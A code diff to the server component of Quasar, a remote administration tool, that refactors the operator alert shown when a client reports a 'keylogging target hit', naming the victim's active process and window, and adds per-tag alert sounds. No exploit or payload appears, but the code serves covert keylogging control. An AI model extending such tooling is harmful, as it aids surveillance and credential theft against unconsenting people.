@@ -1,7 +1,10 @@
 using Quasar.Common.Cryptography;
 using Quasar.Common.Messages;
 using System;
+using System.IO;
 using System.Linq;
+using System.Media;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
@@ -11,6 +14,9 @@ namespace Quasar.Server.Networking
 {
     public class QuasarServer : Server
     {
+        [DllImport("winmm.dll", CharSet = CharSet.Auto)]
+        private static extern int mciSendString(string command, StringBuilder returnValue, int returnLength, IntPtr winHandle);
+
         private readonly Utilities.ClientDatabase _clientDb = new Utilities.ClientDatabase();
 
         /// <summary>
@@ -118,30 +124,8 @@ namespace Quasar.Server.Networking
 
                     bool accept = _clientDb.GetClientAcceptPing(uuid);
 
-                    // If the client reports a target hit and "Accept Ping" is currently disabled,
-                    // ask the operator whether we should allow the client to connect now.
-                    if (!accept && ping.TargetHit)
-                    {
-                        string proc = ping.ActiveProcessName ?? "";
-                        string title = ping.ActiveWindowTitle ?? "";
-                        if (string.IsNullOrWhiteSpace(proc)) proc = "(unknown process)";
-                        if (string.IsNullOrWhiteSpace(title)) title = "(unknown window title)";
-
-                        var msg =
-                            $"Keylogging target hit!\n\nProcess: {proc}\nWindow: {title}\n\nAllow this client to connect now?";
-
-                        var result = MessageBox.Show(
-                            msg,
-                            "Target Hit",
-                            MessageBoxButtons.YesNo,
-                            MessageBoxIcon.Information);
-
-                        if (result == DialogResult.Yes)
-                        {
-                            _clientDb.SetClientAcceptPing(uuid, true);
-                            accept = true;
-                        }
-                    }
+                    if (ping.TargetHit)
+                        accept = HandleTargetHitPrompt(uuid, ping, accept);
 
                     // Update UI/DB (toast + LastPing) and show notification even when checkbox is not enabled.
                     MessageHandler.Process(client, message);
@@ -182,6 +166,12 @@ namespace Quasar.Server.Networking
             }
 
             MessageHandler.Process(client, message);
+
+            if (message is ClientPingRequest pingConnected && pingConnected.TargetHit)
+            {
+                bool accept = _clientDb.GetClientAcceptPing(pingConnected.Uuid ?? client.Value?.Id);
+                HandleTargetHitPrompt(pingConnected.Uuid ?? client.Value?.Id, pingConnected, accept);
+            }
         }
 
         private bool IdentifyClient(Client client, ClientIdentification packet)
@@ -227,6 +217,78 @@ namespace Quasar.Server.Networking
 #else
             return true;
 #endif
+        }
+
+        private void PlayTargetHitTagSound(string uuid)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(uuid)) return;
+                string tagName = _clientDb.GetClientTag(uuid);
+                if (string.IsNullOrWhiteSpace(tagName)) return;
+                var tag = _clientDb.GetTag(tagName);
+                string soundPath = tag?.Sound ?? "";
+                if (string.IsNullOrWhiteSpace(soundPath)) return;
+
+                string resolved = soundPath;
+                if (!Path.IsPathRooted(resolved))
+                    resolved = Path.Combine(Application.StartupPath, resolved);
+                if (!File.Exists(resolved)) return;
+                string ext = Path.GetExtension(resolved)?.ToLowerInvariant() ?? "";
+                if (ext == ".wav")
+                {
+                    var player = new SoundPlayer(resolved);
+                    player.Play();
+                    return;
+                }
+
+                // Support mp3 and other MCI-compatible formats.
+                string alias = "taghit_" + Guid.NewGuid().ToString("N");
+                string safePath = resolved.Replace("\"", "\"\"");
+                mciSendString($"open \"{safePath}\" type mpegvideo alias {alias}", null, 0, IntPtr.Zero);
+                mciSendString($"play {alias}", null, 0, IntPtr.Zero);
+            }
+            catch
+            {
+                // Best-effort only.
+            }
+        }
+
+        private bool HandleTargetHitPrompt(string uuid, ClientPingRequest ping, bool accept)
+        {
+            PlayTargetHitTagSound(uuid);
+
+            string proc = ping.ActiveProcessName ?? "";
+            string title = ping.ActiveWindowTitle ?? "";
+            if (string.IsNullOrWhiteSpace(proc)) proc = "(unknown process)";
+            if (string.IsNullOrWhiteSpace(title)) title = "(unknown window title)";
+
+            if (!accept)
+            {
+                var msg =
+                    $"Keylogging target hit!\n\nProcess: {proc}\nWindow: {title}\n\nAllow this client to connect now?";
+                var result = MessageBox.Show(
+                    msg,
+                    "Target Hit",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Information);
+
+                if (result == DialogResult.Yes)
+                {
+                    _clientDb.SetClientAcceptPing(uuid, true);
+                    accept = true;
+                }
+            }
+            else
+            {
+                MessageBox.Show(
+                    $"Keylogging target hit!\n\nProcess: {proc}\nWindow: {title}",
+                    "Target Hit",
+                    MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
+            }
+
+            return accept;
         }
     }
 }
